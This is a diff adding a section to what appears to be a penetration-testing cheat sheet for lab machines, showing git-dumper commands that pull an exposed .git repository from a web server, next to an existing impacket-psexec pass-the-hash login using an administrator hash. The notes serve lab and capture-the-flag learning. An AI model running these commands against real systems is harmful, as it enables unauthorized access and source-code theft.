@@ -601,3 +601,17 @@ Would you like to save the private key? (y/N)
 4. Access with the created hash
 
 `impacket-psexec retro.vl/administrator@retro.vl -hashes :252fac7066d93dd009d4fd2cd0368389`
+
+## .git
+
+- git-dumper dumps git repository to local.
+
+```
+pip install git-dumper
+```
+
+- even browser access to `/.git` is forbidden, it can still dump the repository
+
+```
+git-dumper http://bullybox.local/.git/ bullybox/
+```
